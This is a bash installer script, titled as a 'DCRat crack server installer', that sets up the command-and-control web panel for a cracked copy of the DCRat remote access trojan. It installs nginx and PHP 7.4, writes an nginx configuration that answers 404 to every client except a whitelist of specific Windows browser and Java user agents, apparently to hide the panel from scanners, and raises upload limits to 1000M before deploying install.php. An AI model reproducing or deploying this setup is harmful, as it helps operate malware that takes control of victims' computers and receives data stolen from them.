#!/bin/bash
echo "DCRat crack server installer by L1nc0In"

read -p "Enter domain name (for example, example.com): " kotoswin

apt update
apt upgrade -y

apt install -y software-properties-common curl wget gnupg2 ca-certificates lsb-release ubuntu-keyring

curl -fsSL https://packages.sury.org/php/apt.gpg | sudo gpg --dearmor -o /usr/share/keyrings/php-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/php-archive-keyring.gpg] https://packages.sury.org/php/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/php.list

add-apt-repository -y ppa:ondrej/php
add-apt-repository -y ppa:ondrej/nginx

apt update

apt install -y nginx

apt install -y php7.4-fpm php7.4-cli php7.4-curl php7.4-sqlite3 php7.4-common php7.4-opcache php7.4-mbstring php7.4-xml php7.4-mysql

mkdir -p /var/www/$kotoswin

chown -R www-data:www-data /var/www/$kotoswin
chmod -R 755 /var/www/$kotoswin

cat > /etc/nginx/sites-available/$kotoswin << EOL
map \$http_user_agent \$deny_access {
    default 1;
    "~*Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36 \(KHTML, like Gecko\) Chrome/96\.0\.4664\.45 Safari/537\.36" 0;
    "~*Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64; rv:94\.0\) Gecko/20100101 Firefox/94\.0" 0;
    "~*Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64; rv:95\.0\) Gecko/20100101 Firefox/95\.0" 0;
    "~*Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36 \(KHTML, like Gecko\) Chrome/95\.0\.4638\.69 Safari/537\.36" 0;
    "~*Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36 \(KHTML, like Gecko\) Chrome/96\.0\.4664\.93 Safari/537\.36" 0;
    "~*Mozilla/5\.0 \(Windows NT 10\.0; rv:91\.0\) Gecko/20100101 Firefox/91\.0" 0;
    "~*Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36 \(KHTML, like Gecko\) Chrome/96\.0\.4664\.55 Safari/537\.36 Edg/96\.0\.1054\.34" 0;
    "~*Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36 \(KHTML, like Gecko\) Chrome/95\.0\.4638\.69 Safari/537\.36 Edg/95\.0\.1020\.53" 0;
    "~*Mozilla/5\.0 \(Windows NT 6\.1; Win64; x64\) AppleWebKit/537\.36 \(KHTML, like Gecko\) Chrome/96\.0\.4664\.45 Safari/537\.36" 0;
    "~*Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36 \(KHTML, like Gecko\) Chrome/95\.0\.4638\.69 Safari/537\.36 OPR/81\.0\.4196\.60" 0;
    "~*Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36 \(KHTML, like Gecko\) Chrome/96\.0\.4664\.45 Safari/537\.36 Edg/96\.0\.1054\.29" 0;
    "~*Mozilla/5\.0 \(Windows NT 10\.0; rv:91\.0\) Gecko/20100101 Firefox/91\.0" 0;
    "~*Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36 \(KHTML, like Gecko\) Chrome/105\.0\.0\.0 Safari/537\.36" 0;
    "~*Java/1\.8\.0_431" 0;
}

server {
    listen 80;
    server_name $kotoswin;
    root /var/www/$kotoswin;
    index index.php index.html;

    client_max_body_size 0;

    client_body_buffer_size 128k;
    client_header_buffer_size 64k;
    large_client_header_buffers 4 64k;

    client_body_timeout 300s;
    client_header_timeout 300s;
    keepalive_timeout 300s;
    send_timeout 300s;
    fastcgi_read_timeout 300s;

    fastcgi_buffer_size 256k;
    fastcgi_buffers 8 128k;
    fastcgi_busy_buffers_size 256k;
    fastcgi_temp_file_write_size 256k;

    location = /install.php {
        satisfy any;
        allow all;
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
        fastcgi_param PHP_VALUE "upload_max_filesize=1000M \n post_max_size=1000M \n max_execution_time=300 \n max_input_time=300";
    }

    location / {
        if (\$deny_access) {
            return 404;
        }

        try_files \$uri \$uri/ /index.php?\$query_string;
    }

    location ~ \.php$ {
        if (\$deny_access) {
            return 404;
        }

        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;

        fastcgi_param PHP_VALUE "upload_max_filesize=1000M \n post_max_size=1000M \n max_execution_time=300 \n max_input_time=300";
    }

    location ~ /\.ht {
        deny all;
    }
}
EOL

ln -sf /etc/nginx/sites-available/$kotoswin /etc/nginx/sites-enabled/

rm -f /etc/nginx/sites-enabled/default

nginx -t

systemctl restart nginx

systemctl restart php7.4-fpm

cat > /etc/php/7.4/fpm/conf.d/custom.ini << 'EOL'
upload_max_filesize = 1000M
post_max_size = 1000M
memory_limit = 512M
max_execution_time = 300
max_input_time = 300
EOL

systemctl restart php7.4-fpm

cp install.php /var/www/$kotoswin/


echo "Server successfully installed! Server link http://$kotoswin/install.php"
